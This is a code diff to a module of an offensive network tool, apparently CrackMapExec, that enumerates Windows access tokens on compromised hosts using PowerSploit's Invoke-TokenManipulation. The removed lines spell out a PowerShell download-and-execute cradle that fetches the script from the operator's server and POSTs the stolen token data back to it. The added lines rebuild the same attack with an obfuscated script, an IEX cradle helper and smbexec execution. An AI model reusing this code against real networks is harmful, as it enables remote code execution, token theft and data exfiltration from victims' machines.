@@ -1,4 +1,4 @@
-from cme.helpers import create_ps_command, obfs_ps_script, gen_random_string, get_ps_script, write_log
+from cme.helpers.powershell import *
 from datetime import datetime
 from StringIO import StringIO
 import os
@@ -11,8 +11,10 @@ class CMEModule:
     '''
 
     name = 'tokens'
-
-    description = "Enumerates available tokens using Powersploit's Invoke-TokenManipulation"
+    description = "Enumerates available tokens"
+    supported_protocols = ['mssql', 'smb']
+    opsec_safe = True
+    multiple_hosts = True
 
     def options(self, context, module_options):
         '''
@@ -39,29 +41,13 @@ class CMEModule:
 
             self.userfile = path
 
-        self.obfs_name = gen_random_string()
+        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-TokenManipulation.ps1')
 
     def on_admin_login(self, context, connection):
+        command = "Invoke-TokenManipulation -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String"
+        launcher = gen_ps_iex_cradle(context, 'Invoke-TokenManipulation.ps1', command)
 
-        payload = '''
-        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-TokenManipulation.ps1');
-        $creds = Invoke-{func_name} -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;
-        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
-        $request.Method = 'POST';
-        $request.ContentType = 'application/x-www-form-urlencoded';
-        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
-        $request.ContentLength = $bytes.Length;
-        $requestStream = $request.GetRequestStream();
-        $requestStream.Write( $bytes, 0, $bytes.Length );
-        $requestStream.Close();
-        $request.GetResponse();'''.format(server=context.server,
-                                          port=context.server_port,
-                                          addr=context.localip,
-                                          func_name=self.obfs_name)
-
-        context.log.debug('Payload: {}'.format(payload))
-        payload = create_ps_command(payload)
-        connection.execute(payload)
+        connection.ps_execute(launcher, methods=['smbexec'])
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
@@ -69,9 +55,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
-                request.wfile.write(ps_script)
+            request.wfile.write(self.ps_script)
 
         else:
             request.send_response(404)
